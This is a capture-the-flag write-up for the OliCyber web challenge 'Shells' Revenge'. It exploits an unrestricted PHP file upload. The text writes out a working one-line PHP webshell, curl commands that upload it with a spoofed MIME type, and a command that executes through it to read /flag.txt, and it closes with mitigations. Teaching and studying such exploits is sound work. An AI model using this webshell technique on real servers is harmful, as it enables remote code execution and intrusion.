# Shells' Revenge

**Competition:** OliCyber
**Category:** Web
**URL:** http://shellrevenge.challs.olicyber.it

---

## Description
> It's time to put an end to Super Mario's tyranny! Koopa brothers, reclaim your freedom. Power to the shells!
The flag is located at /flag.txt
Site: http://shellrevenge.challs.olicyber.it

The goal is to read the `/flag.txt` file on the remote server.

---

## Solution

### 1. Initial reconnaissance

Inspect the main page with curl:

```bash
curl -v http://shellrevenge.challs.olicyber.it
```

Relevant headers returned:
```
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
```

The HTML body contains a file upload form:

```html
<form action="index.php" method="post" enctype="multipart/form-data">
		<input type="file" name="file" id="file">
		<button type="submit" name="submit" value="Invia">Invia</button>
</form>
```

### 2. Identified vulnerability — Unrestricted File Upload (RCE)

The server runs PHP 7.4 on Apache and does not validate uploaded file extensions or content. It's possible to upload a `.php` webshell that will be executed by the server.

### 3. Exploit

Create a simple webshell:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Upload the webshell (spoofing an image MIME type):

```bash
curl -s -X POST "http://shellrevenge.challs.olicyber.it/index.php" \
	-F "file=@shell.php;type=image/gif" \
	-F "submit=Invia"
```

Server response:

```html
<p class='valid'>Upload completed!
	<a href='/uploads/cd660ac6289a0cc54e91e9def5875194/shell.php'>Go</a>
</p>
```

The file is stored under `/uploads/` in a randomly named MD5-like directory.

Execute remote commands to read the flag:

```bash
curl "http://shellrevenge.challs.olicyber.it/uploads/cd660ac6289a0cc54e91e9def5875194/shell.php?cmd=cat+/flag.txt"
```

---

## Flag

```
flag{...}
```

---

## Conclusions

This is a classic **Unrestricted File Upload** vulnerability (OWASP A05): the server accepts arbitrary files without validating extension, real MIME type, or content. Uploading a PHP webshell yields immediate RCE.

**Mitigations recommended:**
- Whitelist allowed extensions (images only)
- Validate server-side the real MIME type and file content (do not trust client Content-Type)
- Store uploads outside the document root or with randomized filenames and without executable extensions
- Configure Apache to disable PHP execution in upload directories
